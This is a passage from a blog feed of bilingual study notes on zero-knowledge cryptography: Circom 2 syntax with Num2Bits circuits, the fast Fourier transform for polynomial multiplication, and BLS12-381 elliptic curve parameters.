class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output b[nBits];</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        //  b[i] &lt;-- (in \ 2 ** i) % 2;</span><br><span class="line">        b[i] &lt;-- (in &gt;&gt; i) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Num2Bits(5);</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>Errors like the following report, normally the problem is that asemicolon is forget to be put at the end of a sentences.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error[P1000]: UnrecognizedToken &#123; token: (586, Token(78, &quot;&#125;&quot;), 587), expected: [&quot;\&quot;!=\&quot;&quot;, &quot;\&quot;%\&quot;&quot;, &quot;\&quot;&amp;\&quot;&quot;, &quot;\&quot;&amp;&amp;\&quot;&quot;, &quot;\&quot;)\&quot;&quot;, &quot;\&quot;*\&quot;&quot;, &quot;\&quot;**\&quot;&quot;, &quot;\&quot;+\&quot;&quot;, &quot;\&quot;,\&quot;&quot;, &quot;\&quot;-\&quot;&quot;, &quot;\&quot;--&gt;\&quot;&quot;, &quot;\&quot;/\&quot;&quot;, &quot;\&quot;:\&quot;&quot;, &quot;\&quot;;\&quot;&quot;, &quot;\&quot;&lt;\&quot;&quot;, &quot;\&quot;&lt;--\&quot;&quot;, &quot;\&quot;&lt;&lt;\&quot;&quot;, &quot;\&quot;&lt;=\&quot;&quot;, &quot;\&quot;&lt;==\&quot;&quot;, &quot;\&quot;=\&quot;&quot;, &quot;\&quot;==\&quot;&quot;, &quot;\&quot;===\&quot;&quot;, &quot;\&quot;==&gt;\&quot;&quot;, &quot;\&quot;&gt;\&quot;&quot;, &quot;\&quot;&gt;=\&quot;&quot;, &quot;\&quot;&gt;&gt;\&quot;&quot;, &quot;\&quot;?\&quot;&quot;, &quot;\&quot;\\\\\&quot;&quot;, &quot;\&quot;]\&quot;&quot;, &quot;\&quot;^\&quot;&quot;, &quot;\&quot;|\&quot;&quot;, &quot;\&quot;||\&quot;&quot;] &#125;</span><br><span class="line">   ┌─ &quot;main.circom&quot;:28:1</span><br></pre></td></tr></table></figure><p>Note: the private input signal should be declared as<code>signal input</code>.</p><h2 id="template-and-component">template and component</h2><p>template is more like the declaration, and component is more like theinitiation.</p><p>The input signal of a template allows us to connect a wire into thesubcomponent of the whole subcircuit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output b[nBits];</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        //  b[i] &lt;-- (in \ 2 ** i) % 2;</span><br><span class="line">        b[i] &lt;-- (in &gt;&gt; i) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template Main()&#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output thirdBit;</span><br><span class="line">    component bitfier = Num2Bits(5);</span><br><span class="line">    bitfier.in &lt;== in;</span><br><span class="line">    thirdBit &lt;== bitfier.b[3] + 3; // the index of b is from 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Main();</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>Poseidon hash function is a snark friendly hash, which is composed ofa bunch of pluses and times operations.</p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
        <tags>
            
            <tag> circom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Circom 2 语法与注意点</title>
      <link href="/blog/2023/03/26/crypto/zk/7.circom_grammar/"/>
      <url>/blog/2023/03/26/crypto/zk/7.circom_grammar/</url>
      
        <content type="html"><![CDATA[<h1 id="circom-2-语法">Circom 2 语法</h1><p>Recommend you go through the documentation of the circom for possiblelook-up later.</p><p>从 circom 的编译过程来看，circom实际上是一个约束语言，它最终编译成多项式约束。相当于人与多项式约束，例如R1CS 之间的一个桥梁。</p><ol type="1"><li><p>circomlib introduction</p><p>circomlib contains a listing of audited, common circuit buildingblocks. You can find many of the circuits we’re discussing today in thislibrary.</p><p>All signals in the circom are field elements in the prime field oforder:<code>r = 21888242871839275222246405745257275088548364400416034343698204186575808495617</code>This is a 254-bit prime known as the <strong>BabyJubJub prime</strong>.It’s the curve order for BN254, a pairing-friendly elliptic curve usedby Ethereum and (formerly) ZCash. You can read more about BN254 inJonathan Wang’s excellent document <ahref="https://hackmd.io/@jpw/bn254">here</a>.</p><p>Compared with general programming language, such as C++, circom as aDSL (Domain-specific language) can ensure constraint which is necessaryfor zkp, These constraints usually involve restrictions on data typesand logical relationships, such as the need to avoid using types such asfloating-point numbers, and the need to ensure that the circuit isbinary pluggable</p><p>Real-world application of circom: tornado cash, Dark forest,Semaphore</p></li><li><p>circom 与 snarkjs</p><p>circom 和 circomlib 库都是 JavaScript语言的前端，他们可以支持多个后端，也就是真正的证明系统 proving system.这两个库都是连接的 snarkjs proving system using BN254 curve. snarkjs isa JavaScript and Pure Web Assembly implementation of zkSNARK and PLONKschemes. It uses the Groth16 Protocol (3 point only and 3 pairings),PLONK and FFLONK. 支持 Groth16， PLONK.</p><p>popular proving system implementation: Circom(snarkjs),ZoKrates(libsnark, bellman) To combine machine learning with circuit,For python, a not-mature library: <ahref="%5BPySNARK%20%7C%20Library%20for%20programming%20SNARKs%20directly%20in%20Python%5D(https://meilof.github.io/pysnark/)">PySNARK(snarkjs,libsnark)</a></p><p>For javascript API about Pytorch, <ahref="https://towardsdatascience.com/onnx-js-universal-deep-learning-models-in-the-browser-fbd268c67513">ONNX.js:Universal Deep Learning Models in The Browser | by Will Badr | TowardsData Science</a></p></li><li><p>datatype date type in the circom:</p><ol type="1"><li><p>Field element value, integer values modulo the prime number p.The size is in the range of [0, p-1], which may be implemented by bigint library in javascript.</p></li><li><p>array with the same type (signal, var, or the same type ofcomponents or arrays again).</p></li></ol></li><li><p>circom 只接受 加号和乘号，可以接受的形式如下：</p><p>a = b + c, a = b * c, a = b(b-1)+b Any equations with degree two orless can be accepted. The compiler will figure out how to break it downinto a sequence of equations that are admitted by a particularconstraint system we are working with.</p><p>We can write linear equations and quadratic equations that dont havemore one quadratic term.</p></li><li><p>zkrepl syntax sugar: json comment input</p></li><li><p>使用三等号来写约束</p></li><li><p>circom 约束的操作符只有加法和乘法，可以写线性方程组或者只有一个二次项的二次方程。 关于 constraint的限制可以看官方文档 <ahref="https://docs.circom.io/circom-language/constraint-generation/">ConstraintGeneration - Circom 2 Documentation</a>. 官方文档阐述了 circom的具体语法细节可以在编程时多看看。</p></li><li><p><code>&lt;--</code> 操作符是 derive 中间变量用的，可以用javascript 的任意运算符，不局限于加法和乘法。</p><p>syntax surgar: <code>&lt;==</code> is equal to constraint<code>&lt;--</code> and witness assignment <code>===</code></p><p>只有 <code>&lt;==</code> 和 <code>===</code>才会被编译到最后的约束系统里，<code>&lt;--</code> 操作符是将符号输入proving machine 之前人工计算的输入，只是这里用代码代替了而已。一个对比是：<code>&lt;--</code> 符号计算的结果错误的话，Circom 会显示circom safe 以及 <strong>assert fail mode</strong> 提示不满约束，而约束等式错误整个意足思就变了。</p><p><code>&lt;--</code> 和一些其他的计算，是为了方便根据 input 生成 prove用的，即使没有这些计算，prover 手动算出来放到最后 proving 过程里也可以。只有需要约束的等式才只能用 乘法和加法。之前的错误答案里的计算和赋值，只是实现了 “prover 不作恶情况下如何根据input 计算出正确的值”，并不能防止 “恶意的 prover 用错误值通过 verify”，因为这些没有进入最后的约束里。</p><p>注意：signal output <code>vari</code> 中的 derived signal<code>vari</code> 时 derived 出来的公开变量，不需要在 zkrepl 的 input中指定值。 注意："&lt;=="的写法只适用于生成的时候也只包含加号和乘号的中间变量，如果生成中间变量的时候需要加和乘之外的操作，那就需要分开写成<code>&lt;--</code> 和 <code>===</code> 的样子了。</p></li><li><p>range check, check 0 &lt;= in =&lt; 15,</p><p>通过将其约束为四个 0/1 比特的表达形式，也就是 num2bit</p></li><li><p>array</p></li><li><p>for loop</p></li><li><p>private and public</p><table><colgroup><col style="width: 17%" /><col style="width: 17%" /><col style="width: 65%" /></colgroup><thead><tr class="header"><th>variable</th><th>private</th><th>public</th></tr></thead><tbody><tr class="odd"><td>signal</td><td><code>signal input</code></td><td><code>signal input</code> and specify in<code>main &#123; public [ b ]&#125;</code></td></tr><tr class="even"><td>derived signal</td><td><code>signal</code></td><td><code>signal output</code></td></tr></tbody></table><ol type="1"><li><code>signal x</code> x is a intermediate value auto-generated bycircom2 at proving time， default private</li><li><code>component main &#123; public [ b ]&#125; = Num2Bits(4);</code> b 是public <strong>input</strong> signals for verifier, b can be an array,where the form of input in zkrepl should be<code>"b": ["1", "2", "3","3"]</code>.</li><li><code>signal output b[nBits];</code> output keyword is used tospecify the derived signal that is made public while it's defined, whichis an output of some computation that you want to reveal to theverifier.</li></ol><p>if you have defined the variable as <code>signal output</code>, itbecomes a public output signal, and there is no need to add it in the<code>component main &#123; public [ b ]&#125; = Num2Bits(4);</code>. The publicin the main is accompanied by the <code>signal</code> input`.</p><p>the private and public keywords are the circom language features.zkSNARK machinery cannot tell which is public or private.</p><blockquote><p>from the programmer's point of view, only public input and outputsignals are visible from outside the circuit, and hence no intermediatesignal can be accessed.</p></blockquote></li><li><p>witness refers to the set of all signals that are passed into theprover.</p></li><li><p><code>var</code> 与 <code>signal</code> 的区别</p><ol type="1"><li><p><code>var</code> is mutable for convenience, however, signal isimmutable.</p></li><li><p>circom 中 <code>var</code> is intermediate variables,<code>signal input</code> variables are given by the user. Thus, onlythe input variables are at the risk of being forged when the constraintsare not done well. ref:<ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/43">【session2】在了解了约束后，对于 Num2Bits 电路突然产生了疑惑 ·Antalpha-Labs/zkp-co-learn · Discussion #43</a></p></li><li><p>The <code>var</code> variable hold either numerical values of thefield or <strong>arithmetic expressions when they are used to buildconstraints (see Constraint Generation)</strong>. They can be namedusing a variable identifier or can be stored in arrays.</p><p>When the <code>var</code> variable is assigned as an arithmeticexpression, it can be seen as a placeholder for you to write the circuitconveniently. In the end, the <code>var</code> variable will be replacedor expanded in the arithmetic expression, which should meet therequirement in Constraint Generation.</p><p>ref: <ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/45">var和 signal 之间的差异？ · Antalpha-Labs/zkp-co-learn · Discussion #45</a><ahref="https://docs.circom.io/circom-language/variables-and-mutability/">Variables&amp; Mutability - Circom 2 Documentation</a></p></li></ol></li><li><p>TODO： Why there are <code>IsEqual</code> and <code>IsZero</code>function exist? the three equal <code>===</code> funciton can check theequality.</p></li></ol><h2id="zk-resources-for-ml-specialists">ZK-resources-for-ML-specialists</h2><p><ahref="https://0xparc.notion.site/public-ZK-resources-for-ML-specialists-70770f20778446d596aa340c2f47d4b2">ModernZK Crypto - Session 2 Lecture Notes - HackMD</a></p><h2 id="references">References</h2><ol type="1"><li><a href="https://hackmd.io/@gubsheep/Hyx1hho5o">Modern ZK Crypto -Session 2 Lecture Notes - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
        <tags>
            
            <tag> circom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速傅里叶变换</title>
      <link href="/blog/2023/03/25/crypto/math/7.fft/"/>
      <url>/blog/2023/03/25/crypto/math/7.fft/</url>
      
        <content type="html"><![CDATA[<h1 id="快速傅里叶变换">快速傅里叶变换</h1><h2id="傅里叶变换离散傅里叶变换与快速傅里叶变换">傅里叶变换、离散傅里叶变换与快速傅里叶变换</h2><blockquote><p>The Fourier Transform is a tool that breaks a waveform (a function orsignal) into an alternate representation, characterized by the<strong>sine and cosine functions </strong>of varying<strong>frequencies</strong>. The Fourier Transform shows that anywaveform can be re-written as the sum of sinusoidals.</p></blockquote><p>傅里叶变换(Fouriertransform，FT)将函数(在应用上称：信号，波形）分解为不同特征的正弦函数的和，从而将其由时域转换到频域。逆傅里叶变换则反向操作，因其基本思想首先由法国学者约瑟夫·傅里叶系统地提出，所以以其名字来命名以示纪念。</p><p>一般情况下，若“傅里叶变换”一词不加任何限定语，则指的是“连续傅里叶变换”（连续函数的傅里叶变换）。在工程应用中，得益于数字技术的应用，绝大多数傅里叶变换的应用都是采用离散傅里叶变换（DFT），更确切的说，是它的快速算法快速傅里叶变换（FFT，FastFourier Transform)。离散傅里叶变换就是对连续傅里叶变换离散化,等价于对信号进行采样，将其变为有限序列的傅里叶变换。</p><blockquote><p>The Discrete Fourier Transform (DFT) is the equivalent of thecontinuous Fourier Transform for signals known only at N instantsseparated by sample times T (i.e. a finite sequence of data) ^4</p></blockquote><p>快速傅里叶变换（Fast Fourier Transform，FFT）是一种可在 O(nlogn)时间内完成的离散傅里叶变换（Discrete Fourier transform，DFT）算法。而从computer science 的视角，FFT 主要是被用来将 O(n^2)复杂度多项式乘法加速为O(nlogn) ，从而快速计算多项式乘法。</p><h2 id="fft">FFT</h2><h3 id="naive-polynomial-multiplication">naive polynomialmultiplication</h3><p>考虑朴素的多项式乘积算法，考虑到两个多项式 A(x), B(x) 的乘积C(x)，假设 A(x)的项数为 n, 其系数构成 n 维向量 <spanclass="math inline">\((a_0, a_1,\cdots,a_n)\)</span>，B(x) 的项数为m，对应 m 维向量 <span class="math inline">\((b_0,b_1,\cdots,b_m)\)</span>。则 C(x) 的系数构成 n+m-1维的向量，其算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        c[i + j] += a[i] * b[j]</span><br></pre></td></tr></table></figure><p>多项式乘法本质上是加法卷积，而 FFT可以加速卷积操作。卷积是信号处理重要操作，公式如下：</p><p><span class="math display">\[(f*g)[k] = \sum_{i=\infty}^{\infty} f[k]g[k-i]\]</span></p><p>则多项式乘法可以表示为下面公式。也就是说要计算出 C(x)的 <spanclass="math inline">\(x^k\)</span> 项的系数，需要 A(x) 的 <spanclass="math inline">\(x^i\)</span> 项的系数和 B(x)的 <spanclass="math inline">\(x^{k-i}\)</span> 项的系数乘积。</p><p><span class="math display">\[C[k] = \sum_{k=\infty}^{\infty} A[k]B[k-i]\]</span></p><p>对应代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def bound(idx, arr): return arr[idx] if idx in range(len(arr)) else 0</span><br><span class="line">for k in range(len(a)+len(b)-1):</span><br><span class="line">    for i in range(k+1):</span><br><span class="line">        c[k] += bound(i, a) * bound(k-i, b)</span><br></pre></td></tr></table></figure><p>注意补 0 操作：对于索引超出 [0,m] 的 f(x) 的多项式系数以及索引超出[0，n] 的 g(x) 多项式系数设置为 0</p><p>也可以写成：<span class="math inline">\(C[k] = \sum_{i+j=k}A[i]B[j]\)</span></p><p>形如 <span class="math inline">\(C[k] = \sum_{i \bigoplus j=k}A[i]B[j]\)</span> 的式子称为卷积，其中 <spanclass="math inline">\(\bigoplus\)</span> 为某种运算。</p><h3 id="polynomial-representations">polynomial representations</h3><p>对于 degree = n-1 多项式 A(x)，</p><ol type="1"><li><p>Coefficient representation: 所有项的系数组成的系数向量<spanclass="math inline">\((a_0, a_1,a_2,...,a_{n-1})\)</span>唯一确定多项式:<span class="math inline">\(A(x) =\sum_{i=0}^{n-1}a_ix^i\)</span></p></li><li><p>Point-value representation: 一组互不相同的<spanclass="math inline">\((x_0, x_1,x_2, \cdots,x_{n})\)</span> 代入A(x),得到 n 个取值 <span class="math inline">\((y_0,y_1, \cdots,y_n)\)</span>, 其中 <span class="math inline">\(y_i = \sum_{j=0}^{n}a_jx_i\)</span>，可以通过拉格朗日插值方法唯一确定多项式。</p></li></ol><p>定理: 一个 n-1 次多项式在 n 个不同点的取值唯一确定了该多项式。</p><p>已知一组插值点 <span class="math inline">\((x_0, x_1,x_2,\cdots,x_{n})\)</span>中 A(x) 与 B(x)（假设多项式阶数相同，没有的视为0，这也就是为什么补 0 的原因）对应的点值向量分别为 <spanclass="math inline">\((y_{a0},y_{a1}, \cdots, y_{an})\)</span> 和 <spanclass="math inline">\((y_{b0},y_{b1}, \cdots, y_{bn})\)</span>, 则C(x)=A(x)B(x)的点值表达式可以在 O(n) 的时间求出来，为 <spanclass="math inline">\((y_{a0}y_{b0},y_{a1}y_{b1}, \cdots,y_{an}y_{bn})\)</span>. 因为 C(x) 的项数为二者之和，而 A(x), B(x) 分别有n,m 项，所以我们代入的差值节点至少有 n+m 个。</p><p>在多项式的点值表示法下多项式乘法可以在 O(n)时间内求出，远快于系数表示法的O(n^2)暴力卷积。但是如果按照定义根据系数表示求一个多项式的点值表示，时间复杂度为O(n^2).已知多项式的点值表示，求其系数表示，使用朴素的插值算法时间复杂度为O(n^2)。 因此，FFT 通过以下思路优化多项式乘法:</p><ol type="1"><li>polynomial multiplication under Point-value representation</li><li>choose root of unity to accelerate the convertion betweenPoint-value representation and class representation.</li></ol><p>当然，如果从矩阵角度理解的话，FFT 通过以下思路优化多项式乘法: factorthe matrix of polynomial multiplication with the property of root ofunity. [^7]</p><h3 id="fft-1">FFT</h3><p>FFT 算法流程：把系数表达转换为点值表达 -&gt; 点值表达相乘-&gt;把点值表达转换为系数表达。</p><p>“把系数表达转换为点值表达”的算法叫做 DFT，“把点值表达转换为系数表达”的算法叫做 IDFT(DFT 的逆运算)</p><p>其实插值点的选择没有规定，只要选择的插值点不同，个数足够就可以进行DFT。但是二者转换的复杂度就是 O(n^2)了，和多项式乘法一样没有必要。而傅立叶，一个很懂复数的人，把选择了单位圆的单位根root of unity 代入了多项式,求点值表达, 利用单位根的特性就实现了 O(nlogn)的效率。</p><h3 id="复数与欧拉函数">复数与欧拉函数</h3><p>Euler's Formula on unit of circle: for any real x , <spanclass="math inline">\(e^{ix} =cosx+isinx\)</span>, where i is theimaginary unit, <span class="math inline">\(i^2= −1\)</span>.</p><p>根据复数的知识，向量的计算，乘除法比较方便，直接将两个相量的模相乘/除、辐角相加/减即可；而加减法就需要做反复的直角坐标-极坐标的相互转换，计算非常麻烦。</p><p>具有实部和虚部的复数做乘法等运算实际上很不方便，但是借助于欧拉公式，虽然加减法计算依然很麻烦，但是复数的乘除法变得简单起来:<strong>复数相乘时,模长相乘,幅角相加</strong>：</p><p>设单位圆上复数点 <span class="math inline">\(x_1,x_2\)</span>相乘，</p><p><span class="math display">\[(cosx_1+isinx_1)(cosx_2+isinx_2) = e^{ix_1}*e^{ix_2} = e^{i(x_1+x_2)}=cos(x_1+x_2)+i sin(x_1+x_2)\]</span></p><p>将单位圆的角度均分为 n份,并选择对应的从原点向外辐射的半径做向量，其中幅角为正且最小的向量称为n 次单位向量，记为 <span class="math inline">\(\omega_n^1\)</span>。<span class="math inline">\(w_n^k = e^{\frac{2 \pi k}{n}i}\)</span>.</p><p>因此，单位向量有以下运算性质:</p><ol type="1"><li><span class="math inline">\(\omega_i = \omega^i\)</span>, where<span class="math inline">\(\omega\)</span> is a generator.</li><li><span class="math inline">\(\omega_n^k = \omega_n^{k-1}*w^1_n \quad(2 \le k \le n)\)</span></li><li><span class="math inline">\(\omega_{2n}^{2k} = w^k_n\)</span>，从几何理解分 2n 份和分 n 份，然后比例一样，辐角一样。</li><li><span class="math inline">\(w^{k+\frac{n}{2}} = -w^k_n\)</span>,多转了半圈，方向相反。</li></ol><p><strong>注意: root of unity 的阶选择 2^m，2的次幂。这与子群的阶和群的阶的关系有关</strong></p><h2 id="discrete-fourier-transform">Discrete Fourier Transform</h2><p>FFT 利用单位根的性质，将多项式分成奇偶，采用分治方式操作。</p><p>DFT: 考虑 n 项（deg=n-1）多项式 A(x), 其系数向量为 <spanclass="math inline">\((a_0, a_1, \cdots, a_{n-1})\)</span>, 将 n次单位根的 0~n-1 次幂分别代入 A(x) 得到其点值向量 <spanclass="math inline">\((A(w_n^0), A(w_n^1), \cdots,A(w_n^{n-1}))\)</span>. 注意: 这里假设 n 是 2 的幂次。</p><p>对于 <span class="math inline">\(A(x) = a_0 + a_1x^1 + \cdots +a_{n-1}x^{n-1}\)</span>，将其奇偶分开，得到:</p><p><span class="math inline">\(A(x) = a_0 + a_2x^2 + a_4x^4 + \cdots +a_{n-2}x^{n-2} + x(a_1 + a_3x^2 + a_5x^4 + \cdots +a_{n-1}x^{n-2})\)</span></p><p><span class="math inline">\(AL(x) = a_0 + a_2x^2 + a_4x^4 + \cdots +a_{n-2}x^{\frac{n-2}{2}}\)</span></p><p><span class="math inline">\(AR(x) = a_1 + a_3x^2 + a_5x^2 + \cdots +a_{n-1}x^{\frac{n-2}{2}})\)</span></p><p><span class="math inline">\(A(x) = AL(x^2) + xAR(x^2)\)</span></p><p>然后将单位根分别带入 AL(x^2) 和 AR(x^2)</p><p>设 <span class="math inline">\(0 \le k \le \frac{n}{2}-1 \quad k \inZ\)</span> , 根据前面提到的单位根的特性，<spanclass="math inline">\(A(w_n^k) = AL(w_n^{2k}) + w_n^{k} AR(x^{2k}) =AL(w_{n/2}^{k}) + w_n^{k} AR({n/2}^{k})\)</span></p><p>当 $ k+ n-1$,</p><p><span class="math display">\[A(w_n^{k+\frac{n}{2}})= AL(w_{n}^{2k+n}) + w_n^{k+\frac{n}{2}} AR(w_{n}^{2k+n})= AL(w_{n/2}^{k}) - w_n^{k} AR(w_{n/2}^{k})\]</span></p><p>注意 k 与 k+n/2 取遍了[0，n-1]中的 n 个整数，保证了可以由这 n个点值反推解出系数.</p><p>因此，只需要知道<span class="math inline">\(AL(x)\)</span> 和 <spanclass="math inline">\(AR(x)\)</span> 分别在 <spanclass="math inline">\(w_{n/2}^0,w_{n/2}^1,\cdots,w_{n/2}^{n/2-1}\)</span>的取值，就可以在 O(n) 时间得出 A(x) 的取值，而二者是A(x)的一般规模，可转化为子问题递归求解，时间复杂度: T(n) = 2T(n/2)+O(n)= O(nlogn).</p><h2 id="inverse-discrete-fourier-transform">Inverse Discrete FourierTransform</h2><p>使用快速傅里叶变换将点值表示的多项式转化为系数表示，这个过程叫做离散傅里叶反变换（InverseDiscrete Fourier Transform）。</p><h2 id="references">References</h2><p>推荐 Introduction to Algorithms，讲解思路很好，从 evaluation onpoint-value polynomial 到 FFT,通过 Vandermonde matrix 求逆来讲解 inverseFFT.</p><ol type="1"><li>TODO -[ ] <ahref="http://mitpress.mit.edu/9780262046305/introduction-to-algorithms/">Introductionto Algorithms CHAPTER 32: POLYNOMIALS AND THE FFT</a></li><li><ahref="https://zh.wikipedia.org/wiki/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2">傅里叶变换- 维基百科，自由的百科全书</a></li><li>TODO -[ ] <ahref="https://betterexplained.com/articles/an-interactive-guide-to-the-fourier-transform/">AnInteractive Guide To The Fourier Transform – BetterExplained</a></li><li>TODO -[ ] <ahref="https://jakevdp.github.io/blog/2013/08/28/understanding-the-fft/">Understandingthe FFT Algorithm | Pythonic Perambulations</a></li><li><a href="https://www.thefouriertransform.com/">FourierTransform</a></li><li>^4 <ahref="https://www.robots.ox.ac.uk/~sjrob/Teaching/SP/l7.pdf">DFT.pdf</a></li><li><ahref="https://towardsdatascience.com/understanding-discrete-convolution-as-polynomial-multiplication-5f94a13acd55">UnderstandingDiscrete Convolution as Polynomial Multiplication | by Shailesh Kumar |Towards Data Science</a></li><li>[^7] <ahref="https://github.com/zlotus/notes-linear-algebra/blob/master/chapter27.ipynb">gilbertstrang linear-algebra/chapter27.ipynb GitHub</a></li><li><ahref="https://www.luogu.com.cn/blog/command-block/fft-xue-xi-bi-ji">傅里叶变换(FFT)学习笔记- command_block 的博客 - 洛谷博客</a></li><li><ahref="https://zhuanlan.zhihu.com/p/31584464">一小时学会快速傅里叶变换（FastFourier Transform） - 知乎</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.有限域上的椭圆曲线</title>
      <link href="/blog/2023/03/24/crypto/math/6.ecc_finitefield/"/>
      <url>/blog/2023/03/24/crypto/math/6.ecc_finitefield/</url>
      
        <content type="html"><![CDATA[<h1 id="有限域上的椭圆曲线">5.有限域上的椭圆曲线</h1><p>generator对有限域上的椭圆曲线是非常重要的，因为椭圆曲线上的运算都是与 generator相关的。</p><p>选择一个合适的 generator，使得整个 prime field 足够大，而且 order足够高(足够多地遍历点),可以极大地增强椭圆曲线的安全性。</p><p>In most situations, an Elliptic Curve E is the graph of an equationof the form <span class="math inline">\(y^2 = x^3 + Ax + B\)</span>,where A and B are constants. This is called the Weierstrass equation foran elliptic curve.</p><p>TODO: <ahref="http://www.umsl.edu/~siegelj/information_theory/projects/elliptic_curves_group_law.pdf">elliptic_curves_group_law.pdf</a></p><h2 id="常见椭圆曲线">常见椭圆曲线</h2><p>BLS12-381 p =0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001Generator</p><h3 id="bls12-381">BLS12-381</h3><p>BLS12-381 (2017) or 255-bit curve (EIP-4844 KZG commitment curve).Developed by Sean Bowe for ZCash, and will be used by Ethereum</p><p>Many protocols are putting it to use for digital signatures andzero-knowledge proofs: Zcash, Ethereum 2.0, Skale, Algorand, Dfinity,Chia, and more.</p><p>BLS12-381 is a pairing-friendly elliptic curve. Pairing-basedcryptography has been developed over the last couple of decades,enabling useful new applications such as short digital signatures thatare efficiently aggregatable, identity-based cryptography, single-roundmulti-party key exchange, and efficient polynomial commitment schemessuch as KZG commitments.</p><p>The basic equation of the BLS12-381 curve is <spanclass="math inline">\(y^2 = x^3 + 4\)</span></p><p>TODO - [ ] 为什么既有 field order 又有 subgroup order？</p><p>Field modulus:<code>0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab field order = 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</code></p><p>Subgroup size、Order of BLS12-381 elliptic curve:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group order = <span class="built_in">hex</span>(<span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span>)</span><br><span class="line">order= <span class="number">0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001</span></span><br></pre></td></tr></table></figure><p>该曲线的阶最后很多 0，然后有一个 1，是因为 order-1是乘法群的阶，然后可以产生具有高阶的 root of unity 的乘法子群。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PRIMITIVE_ROOT = 5</span><br><span class="line">MODULUS = b.curve_order</span><br><span class="line">def get_root_of_unity(order):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    